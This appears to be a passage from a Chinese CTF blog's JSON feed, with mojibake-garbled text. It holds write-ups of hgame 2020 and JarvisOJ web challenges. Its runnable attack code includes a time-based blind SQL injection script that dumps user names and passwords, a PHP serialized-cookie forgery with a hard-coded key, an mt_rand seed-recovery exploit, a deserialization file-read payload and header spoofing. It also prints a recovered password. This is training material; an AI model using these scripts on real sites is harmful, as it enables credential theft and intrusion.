class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Rank</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$rank</span> = <span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$serverKey</span>;     <span class=\"hljs-comment\">// æœåŠ¡å™¨çš„ Key</span><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$key</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;key = &amp;<span class=\"hljs-keyword\">$this</span>-&gt;serverKey;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Rank();<br><span class=\"hljs-variable\">$encryptKey</span> = <span class=\"hljs-string\">&quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&quot;</span>;<br><span class=\"hljs-variable\">$playername</span> = <span class=\"hljs-string\">&quot;%s&quot;</span>;<br><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playername</span>, <span class=\"hljs-variable\">$encryptKey</span>];<br><span class=\"hljs-variable\">$sign</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br><span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>    <span class=\"hljs-variable\">$sign</span> .= md5(<span class=\"hljs-variable\">$sign</span> . <span class=\"hljs-variable\">$value</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$sign</span> = md5(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-variable\">$sign</span> = base64_encode(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$sign</span>;<br></code></pre></td></tr></table></figure>\n<p>æ”¹ä¸€ä¸‹cookieå°±æ‹¿åˆ°äº†flag</p>\n<h2 id=\"äºŒå‘å…¥é­‚\"><a href=\"#äºŒå‘å…¥é­‚\" class=\"headerlink\" title=\"äºŒå‘å…¥é­‚\"></a>äºŒå‘å…¥é­‚</h2><p>æ‰“å¼€é¢˜ç›®ä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“åœ¨å¹²ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œçœ‹äº†WPæ‰çŸ¥é“å¥½åƒæ˜¯è¦é€šè¿‡ç”Ÿæˆçš„éšæœºæ•°æ¥è¿˜åŸseedï¼Œéš¾æ€ªå›¾ç‰‡è¯´èµ¶å¿«äº¤å‡ºç§å­ã€‚ã€‚æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ‹¿åˆ°seedï¼Œä¸€ç§æ˜¯é€šè¿‡å¾—çŸ¥</p>\n<ol>\n<li>ä»mt_rand()è·å–2ä¸ªå€¼ï¼šR000ä»¥åŠR227ï¼Œä¸­é—´é—´éš”226ä¸ªå€¼ï¼›æ­¤å¤–è¿˜éœ€çŸ¥é“R000ä¹‹å‰å·²ç”Ÿæˆçš„å€¼çš„ä¸ªæ•°ï¼ˆç”¨iè¡¨ç¤ºï¼‰ï¼›</li>\n<li>æ ¹æ®è¿™äº›å€¼ç®—å‡ºåŠ æ‰°çŠ¶æ€å€¼ï¼›</li>\n<li>å¼‚æˆ–è¿™äº›çŠ¶æ€å€¼ï¼Œæ¨æµ‹å‡ºåŸå§‹çš„çŠ¶æ€å€¼ï¼ˆs228ï¼‰ï¼›</li>\n<li>æ ¹æ®s228ï¼Œæ¨æµ‹å‡ºs0ï¼Œè·å–ç§å­ã€‚<br><a href=\"https://www.anquanke.com/post/id/196831\">https://www.anquanke.com/post/id/196831</a><br>è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡phpçš„php_mt_seedå‡½æ•°ç›´æ¥çˆ†ç ´seed<br><a href=\"https://www.freebuf.com/vuls/192012.html\">https://www.freebuf.com/vuls/192012.html</a></li>\n</ol>\n<p>æ”¾ä¸€ä¸ªç½‘ä¸Šçš„expï¼š</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">import requests<br>import os<br>s = requests<span class=\"hljs-selector-class\">.session</span>()<br>url = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/random.php?times=228&quot;</span><br>cookie = &#123;<span class=\"hljs-string\">&#x27;PHPSESSID&#x27;</span>:<span class=\"hljs-string\">&#x27;lf08on0tsqpggqqvulpsg278h1&#x27;</span>&#125;<br>c = s<span class=\"hljs-selector-class\">.get</span>(url,cookies = cookie)<br>ans = str(c.text)<br>ans = eval(ans)<br>R0 = ans<span class=\"hljs-selector-attr\">[0]</span><br>R227 = ans<span class=\"hljs-selector-attr\">[227]</span><br>req = <span class=\"hljs-string\">&#x27;python reverse_mt_rand.py &#x27;</span>+str(R0)+<span class=\"hljs-string\">&#x27; &#x27;</span>+str(R227)+<span class=\"hljs-string\">&#x27; 0 0&#x27;</span><br><span class=\"hljs-selector-tag\">p</span> = os<span class=\"hljs-selector-class\">.popen</span>(req)<br>x = <span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.read</span>()<br><span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.close</span>()<br>x = str(x<span class=\"hljs-selector-class\">.replace</span>(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>))<br>url2 = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/verify.php&quot;</span><br>data = &#123;<span class=\"hljs-string\">&quot;ans&quot;</span>:x&#125;<br>final = s<span class=\"hljs-selector-class\">.post</span>(url = url2,cookies = cookie,data = data)<br><span class=\"hljs-function\"><span class=\"hljs-title\">print</span><span class=\"hljs-params\">(final.text)</span></span><br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Cosmosçš„äºŒæ‰‹å¸‚åœº\"><a href=\"#Cosmosçš„äºŒæ‰‹å¸‚åœº\" class=\"headerlink\" title=\"Cosmosçš„äºŒæ‰‹å¸‚åœº\"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h2><p>æ¡ä»¶ç«äº‰çš„é¢˜ç›®ï¼Œç”¨burpå‘åŒ…ï¼Œä¹°å…¥æ¯”å–å‡ºå°‘ä¸€äº›ï¼Œåˆ·ä½™é¢</p>\n<h2 id=\"Cosmosçš„ç•™è¨€æ¿-2\"><a href=\"#Cosmosçš„ç•™è¨€æ¿-2\" class=\"headerlink\" title=\"Cosmosçš„ç•™è¨€æ¿-2\"></a>Cosmosçš„ç•™è¨€æ¿-2</h2><p>å‘ç°åˆ é™¤ç•™è¨€éƒ¨åˆ†å­˜åœ¨sqlæ³¨å…¥ï¼Œç”±äºæ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½ç›²æ³¨<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png\" alt=\"3\"></p>\n<p>æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://139.199.182.61:19999/index.php?method=<span class=\"hljs-keyword\">delete</span>&amp;delete_id=<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">test = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>schema_name<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.schemata<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(table_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.tables<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_schema=<span class=\"hljs-keyword\">database</span>()<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(column_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.columns<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_name=<span class=\"hljs-string\">&#x27;user&#x27;</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>concat_ws(<span class=\"hljs-number\">0x5e</span>,name,<span class=\"hljs-keyword\">password</span>)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>babysql.<span class=\"hljs-keyword\">user</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">cookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;9g4b91gspvooe2up4k2blubbqo&#x27;&#125;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,20):</span><br><span class=\"hljs-string\">\tfor j in range(33,127):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span><span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">5</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tprint(chr(j))</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload,cookies = cookie)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=5):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>æ‹¿åˆ°è´¦å·å¯†ç ï¼Œä½†æ˜¯ç™»é™†æç¤ºé”™è¯¯ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œå¤šè·‘å‡ æ¬¡æ‰æ‹¿åˆ°äº†æ­£ç¡®çš„è´¦å·å¯†ç ï¼šcosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "url": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "title": "JarvisOj",
            "date_published": "2019-11-27T14:22:21.000Z",
            "content_html": "<p><a href=\"https://www.jarvisoj.com/\">https://www.jarvisoj.com/</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"LocalHost\"><a href=\"#LocalHost\" class=\"headerlink\" title=\"LocalHost\"></a>LocalHost</h2><p>æŠ“åŒ…åŠ ä¸€ä¸ªâ€œX-Forwarded-For: 127.0.0.1â€å®Œäº‹</p>\n<h2 id=\"PORT51\"><a href=\"#PORT51\" class=\"headerlink\" title=\"PORT51\"></a>PORT51</h2><p>åˆšå¼€å§‹ä»¥ä¸ºæ”¹ç«¯å£å°±å®Œäº†ï¼Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘å¤ªèœäº†ï¼Œè¦æ”¹æˆ‘ä»¬çš„è®¿é—®ç«¯å£<br><code>curl --loacl-port 51 http://web.jarvisoj.com:32770/</code>å°±æ‹¿åˆ°äº†flagï¼Œï¼Œå­¦åˆ°äº†</p>\n<h2 id=\"ç¥ç›¾å±€çš„ç§˜å¯†\"><a href=\"#ç¥ç›¾å±€çš„ç§˜å¯†\" class=\"headerlink\" title=\"ç¥ç›¾å±€çš„ç§˜å¯†\"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h2><p>è¿›å»ä»¥åå°±æ˜¯ä¸€å¼ å›¾ç‰‡<br>å…ˆview-sourceä¸€ä¸‹çœ‹åˆ°äº†ï¼š<br><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code><br>çœ‹åˆ°äº†ä¸€ä¸ªshowimg.phpï¼Œçœ‹æ ·å­åº”è¯¥å¯ä»¥ç”¨imgè¿™ä¸ªå‚æ•°æ¥è¯»æ–‡ä»¶ï¼Œå…ˆè¯»ä¸€ä¸‹showimg.phpè¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†çœ‹ä¸€ä¸‹index.phpçœ‹åˆ°äº†æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œçœ‹æ ·å­æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œæºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">&#x27;shield.php&#x27;</span>);<br>\t<span class=\"hljs-variable\">$x</span> = <span class=\"hljs-keyword\">new</span> Shield();<br>\t<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>]) &amp;&amp; <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-variable\">$g</span>)) &#123;<br>\t\t<span class=\"hljs-variable\">$x</span> = unserialize(<span class=\"hljs-variable\">$g</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$x</span>-&gt;readfile();<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>çœ‹åˆ°äº†shield.phpï¼Œè¯»ä¸€ä¸‹çœ‹çœ‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>\t<span class=\"hljs-comment\">//flag is in pctf.php</span><br>\t<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span> </span>&#123;<br>\t\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&#x27;&#x27;</span></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">$this</span> -&gt; file = <span class=\"hljs-variable\">$filename</span>;<br>\t\t&#125;<br>\t\t<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readfile</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;..&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span>  <br>\t\t\t&amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;/&#x27;</span>)===<span class=\"hljs-literal\">FALSE</span> &amp;&amp; stripos(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>)==<span class=\"hljs-literal\">FALSE</span>) &#123;<br>\t\t\t\t<span class=\"hljs-keyword\">return</span> @file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;file);<br>\t\t\t&#125;<br>\t\t&#125;<br>\t&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span></span>&#123;<br>\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">&#x27;pctf.php&#x27;</span>;<br>&#125;<br><span class=\"hljs-variable\">$c</span> = <span class=\"hljs-keyword\">new</span> Shield();<br><span class=\"hljs-keyword\">echo</span> serialize(<span class=\"hljs-variable\">$c</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>â€œview-source:<a href=\"http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D&quot;\">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}&quot;</a><br>å°±æ‹¿åˆ°äº†flag</p>\n<h2 id=\"Login\"><a href=\"#Login\" class=\"headerlink\" title=\"Login\"></a>Login</h2><p>æç¤ºè¯´éœ€è¦å¯†ç æ‰èƒ½æ‹¿åˆ°flagï¼Œï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹å‘ç°å½“è¾“å…¥åŒå¼•å·çš„æ—¶å€™ä¼šæŠ¥sqlé”™è¯¯ï¼Œåº”è¯¥æ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯æµ‹è¯•äº†å¥½ä¹…æ²¡å‘ç°æœ‰ä»€ä¹ˆç”¨ï¼Œï¼Œçœ‹äº†ä¸€çœ¼wpè¦å…ˆæŠ“åŒ…ï¼Œï¼Œåœ¨headé‡Œé¢æœ‰hintã€‚ã€‚ã€‚<br>â€˜Hint: â€œselect * from <code>admin</code> where password=â€™â€.md5($pass,true).â€â€˜â€œâ€˜<br>ç„¶åæƒ³åˆ°åº”è¯¥æ˜¯md5çš„å®‰å…¨é—®é¢˜ï¼Œ0eå¼€å¤´çš„é—®é¢˜åº”è¯¥æ˜¯ä¸å­˜åœ¨ï¼Œå‚è€ƒäº†ä¸€ä¸‹<a href=\"https://www.cnblogs.com/piaomiaohongchen/p/10659359.html\">https://www.cnblogs.com/piaomiaohongchen/p/10659359.html</a><br>è¯•äº†ä¸€ä¸‹æ–‡ä¸­ç»™å‡ºçš„å¯†ç ffifdyopå°±æ‹¿åˆ°äº†flag</p>\n<h2 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h2><p>æ‰“å¼€ç½‘é¡µåªæœ‰ä¸€ä¸ªhello worldï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œäºæ˜¯å°±çœ‹çœ‹æœ‰æ²¡æœ‰robots.txtï¼Œçœ‹åˆ°äº†admin_s3cr3t.phpï¼Œè®¿é—®æ‹¿åˆ°å‡çš„flagï¼Œæƒ³äº†æƒ³åº”è¯¥æ˜¯è·Ÿcookieæœ‰å…³ï¼Œäºæ˜¯å°±æŠ“åŒ…çœ‹çœ‹ï¼Œåº”è¯¥æ˜¯åœ¨cookieæœ‰åˆ¤æ–­æ˜¯ä¸æ˜¯adminï¼Œä½†æ˜¯æˆ‘æŠ“åˆ°çš„åŒ…æ²¡æœ‰cookieï¼Œåè€Œæ˜¯çœ‹åˆ°ä¸€ä¸ªç±»ä¼¼äºbase64çš„ä¸€ä¸²ç¼–ç ï¼Œå°±ä¸€ç›´åœ¨æè¿™ä¸ªä¹Ÿæ²¡æå‡ºä¸ªå•¥ï¼Œåæ¥çœ‹äº†ä¸€ä¸‹wpåˆ«äººå°±æœ‰æŠ“åˆ°admin=0.ã€‚ã€‚ã€‚æˆ‘å°±é‡æ–°åˆ·æ–°é‡æ–°æŠ“äº†ä¸€ä¸‹åŒ…æ‰çœ‹åˆ°äº†è¿™ç©æ„ï¼Œï¼Œæ”¹æˆ1å°±æ‹¿åˆ°äº†flagï¼Œçœ‹æ¥åº”è¯¥æ˜¯è¿˜æ²¡æœ‰è®¾ç½®cookieå°±è¢«æˆ‘æŠ“åŒ…äº†ï¼Œï¼Œï¼Œå®³ï¼Œä¸‹æ¬¡æ³¨æ„</p>\n<h2 id=\"IN-A-mess\"><a href=\"#IN-A-mess\" class=\"headerlink\" title=\"IN A mess\"></a>IN A mess</h2><p>1.æŸ¥çœ‹ç½‘é¡µæºä»£ç è®©æˆ‘è®¿é—®index.phpsï¼Œçœ‹åˆ°æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>])<br>&#123;<br>\theader(<span class=\"hljs-string\">&#x27;Location: index.php?id=1&#x27;</span>);<br>\t<span class=\"hljs-keyword\">exit</span>();<br>&#125;<br><span class=\"hljs-variable\">$id</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>];<br><span class=\"hljs-variable\">$a</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>];<br><span class=\"hljs-variable\">$b</span>=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>];<br><span class=\"hljs-keyword\">if</span>(stripos(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;.&#x27;</span>))<br>&#123;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;Hahahahahaha&#x27;</span>;<br>\t<span class=\"hljs-keyword\">return</span> ;<br>&#125;<br><span class=\"hljs-variable\">$data</span> = @file_get_contents(<span class=\"hljs-variable\">$a</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>);<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$data</span>==<span class=\"hljs-string\">&quot;1112 is a nice lab!&quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$id</span>==<span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> strlen(<span class=\"hljs-variable\">$b</span>)&gt;<span class=\"hljs-number\">5</span> <span class=\"hljs-keyword\">and</span> eregi(<span class=\"hljs-string\">&quot;111&quot;</span>.substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-string\">&quot;1114&quot;</span>) <span class=\"hljs-keyword\">and</span> substr(<span class=\"hljs-variable\">$b</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>)!=<span class=\"hljs-number\">4</span>)<br>&#123;<br>\t<span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;flag.txt&quot;</span>);<br>&#125;<br><span class=\"hljs-keyword\">else</span><br>&#123;<br>\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">&quot;work harder!harder!harder!&quot;</span>;<br>&#125;<br><br><br><span 